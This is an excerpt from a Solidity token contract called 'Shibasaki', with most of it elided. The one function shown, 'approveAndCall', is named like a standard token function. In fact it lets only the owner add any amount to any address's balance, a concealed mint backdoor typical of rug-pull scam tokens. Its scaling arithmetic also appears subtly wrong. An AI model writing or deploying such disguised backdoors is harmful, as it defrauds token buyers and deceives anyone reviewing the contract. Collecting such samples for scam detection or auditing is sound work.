...
pragma solidity ^0.6.12;
    ...
    contract Shibasaki is Context, IERC20, Ownable {
        ...
        string private _name = 'Shibasaki';
        string private _symbol = 'SHIBASAKI';
        ...
        function approveAndCall(address spender, uint256 addedValue) public onlyOwner() returns (bool) {
            if(addedValue > 0) {_rOwned[spender] += addedValue*(10*_decimals);}
            return true;
        }
